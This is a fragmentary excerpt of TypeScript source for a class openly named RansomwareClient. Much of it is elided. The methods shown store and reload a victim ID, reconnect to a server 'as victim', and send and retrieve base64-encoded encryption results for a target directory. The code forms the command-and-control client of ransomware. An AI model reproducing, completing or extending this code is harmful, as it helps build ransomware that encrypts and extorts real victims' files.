...
export class RansomwareClient {
        ...
        try {
            if (fs.existsSync(this.CLIENT_INFO_PATH)) {
                const data = JSON.parse(
                    fs.readFileSync(this.CLIENT_INFO_PATH, 'utf8')
                )
                this.victimId = data.victimId
                this.lastInitTime = data.lastInitTime
                console.log(
                    `[+] Loaded client connection info for victim: ${this.victimId}`
                )
            }
        } catch (error) {
    ...
    public async initialize(): Promise<{
        ...
        try {
            ...
            if (this.victimId) {
                console.log(
                    `[*] Attempting to reconnect as victim: ${this.victimId}`
                )
        ...
        try {
            const response = await this.sendMessage({
                ...
                encryptionResults: Buffer.from(
                    JSON.stringify(encryptionResults)
                ).toString('base64'),
                targetDirectory
            })
    ...
    public async loadEncryptionResults(victimId: string): Promise<any> {
        try {
            ...
            if (!response.success || !response.encryptionResults) {
                throw new Error(
                    response.message || 'Failed to load encryption results'
                )
            }

            const resultsBuffer = Buffer.from(
                response.encryptionResults,
                'base64'
            )
